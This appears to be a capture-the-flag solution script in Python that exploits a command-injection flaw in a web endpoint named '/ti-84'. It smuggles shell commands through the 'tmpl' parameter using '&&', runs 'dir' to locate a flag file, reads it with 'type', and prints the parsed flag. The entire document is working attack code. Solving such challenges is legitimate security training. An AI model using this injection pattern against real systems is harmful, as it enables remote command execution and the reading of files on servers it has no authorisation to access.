import requests
import sys

target = sys.argv[1]
target = target.replace("http://", "").replace("https://", "")
target = "http://" + target


def exploit(cmd):
    return requests.get(target + "/ti-84", params={
        "code": "1+1",
        "tmpl": f"🐈.tmpl && {cmd} && echo "
    }).text

flag_path = exploit("dir").split("flag")[1].split(".txt")[0].strip()
flag_path = "flag" + flag_path + ".txt"
flag = exploit(f"type {flag_path}").split(".;,;.")[1].split("}")[0].strip()
print(f"Flag: .;,;.{flag}}}")
